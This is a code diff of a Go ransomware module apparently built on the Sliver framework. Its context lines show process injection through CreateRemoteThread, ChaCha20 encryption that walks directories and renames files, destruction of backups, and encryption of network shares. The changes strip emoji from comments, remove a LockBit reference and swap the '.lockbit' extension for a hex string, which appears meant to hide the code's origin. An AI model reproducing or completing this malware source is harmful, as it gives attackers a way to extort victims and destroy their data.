@@ -158,7 +158,7 @@ func findProcessPIDAdvanced(processName string) (uint32, error) {
 	return 0, fmt.Errorf("process %s not found", processName)
 }
 
-// 🎯 TECHNIQUE 1: CreateRemoteThread Injection
+// TECHNIQUE 1: CreateRemoteThread Injection
 func injectCreateRemoteThread(pid uint32, payload []byte) (string, error) {
 	processHandle, err := windows.OpenProcess(
 		windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
@@ -217,21 +217,21 @@ func injectCreateRemoteThread(pid uint32, payload []byte) (string, error) {
 	return fmt.Sprintf("CreateRemoteThread success - PID: %d", pid), nil
 }
 
-// 🎯 TECHNIQUE 2: APC Injection (More stealthy)
+// TECHNIQUE 2: APC Injection (More stealthy)
 func injectAPC(pid uint32, payload []byte) (string, error) {
 	// Advanced APC injection implementation
 	// Note: Simplified for example
 	return fmt.Sprintf("APC Injection simulated - PID: %d", pid), nil
 }
 
-// 🎯 TECHNIQUE 3: Thread Hijacking
+// TECHNIQUE 3: Thread Hijacking
 func injectThreadHijack(pid uint32, payload []byte) (string, error) {
 	// Advanced thread hijacking implementation  
 	// Note: Simplified for example
 	return fmt.Sprintf("Thread Hijack simulated - PID: %d", pid), nil
 }
 
-// 🎯 ADVANCED LAYERED ENCRYPTION
+// ADVANCED LAYERED ENCRYPTION
 func advancedLayeredEncrypt(data []byte) ([]byte, error) {
 	encryptionRequest := &sliverpb.RansomwareEncrypt{}
 	if err := proto.Unmarshal(data, encryptionRequest); err != nil {
@@ -280,7 +280,7 @@ func advancedLayeredEncrypt(data []byte) ([]byte, error) {
 	return resultData, nil
 }
 
-// 🎯 GENERATE STRONG ENCRYPTION KEY
+// GENERATE STRONG ENCRYPTION KEY
 func generateStrongEncryptionKey() []byte {
 	key := make([]byte, 32) // ChaCha20 key
 	if _, err := rand.Read(key); err != nil {
@@ -292,7 +292,7 @@ func generateStrongEncryptionKey() []byte {
 	return key
 }
 
-// 🎯 CHACHA20 ENCRYPTION WITH FILE WALKING
+// CHACHA20 ENCRYPTION WITH FILE WALKING
 func encryptWithChaCha20(rootPath string, extensions []string, key []byte) []*sliverpb.EncryptedFile {
 	var encryptedFiles []*sliverpb.EncryptedFile
 
@@ -306,7 +306,7 @@ func encryptWithChaCha20(rootPath string, extensions []string, key []byte) []*sl
 			return nil
 		}
 
-		// Check extension against LockBit 4.0 list
+		
 		if shouldEncryptAdvanced(path, extensions) {
 			if success := encryptFileChaCha20(path, key); success {
 				encryptedFiles = append(encryptedFiles, &sliverpb.EncryptedFile{
@@ -377,8 +377,8 @@ func encryptFileChaCha20(filePath string, key []byte) bool {
 		return false
 	}
 
-	// Rename with .lockbit extension
-	newPath := filePath + ".lockbit"
+	// Rename with .0x7a0xdf0x6c340xd83c0xdf4c0 extension
+	newPath := filePath + ".0x7a0xdf0x6c340xd83c0xdf4c0"
 	os.Rename(filePath, newPath)
 
 	return true
@@ -418,7 +418,7 @@ func destroyBackupSystems() {
 	}
 }
 
-// 🎯 ADVANCED NETWORK SHARE ENCRYPTION
+// ADVANCED NETWORK SHARE ENCRYPTION
 func encryptNetworkSharesAdvanced(key []byte) []*sliverpb.EncryptedFile {
 	var networkFiles []*sliverpb.EncryptedFile
 
@@ -462,7 +462,7 @@ func discoverNetworkShares() []string {
 	return shares
 }
 
-// 🎯 ENCRYPT BOOT RECORDS (Nuclear option)
+// ENCRYPT BOOT RECORDS (Nuclear option)
 func encryptBootRecords() {
 	// {{if .Config.Debug}}
 	log.Printf("[encrypt] Nuclear option: Encrypting boot records")
@@ -472,7 +472,7 @@ func encryptBootRecords() {
 	// Note: This is extremely destructive - for demonstration only
 }
 
-// 🎯 CHECK IF SYSTEM FILE
+// CHECK IF SYSTEM FILE
 func isSystemFile(path string) bool {
 	systemDirs := []string{
 		"C:\\Windows\\",
@@ -490,7 +490,7 @@ func isSystemFile(path string) bool {
 	return false
 }
 
-// 🎯 ADVANCED EXTENSION CHECKING
+// ADVANCED EXTENSION CHECKING
 func shouldEncryptAdvanced(filePath string, extensions []string) bool {
 	fileExt := strings.ToLower(filepath.Ext(filePath))
 	
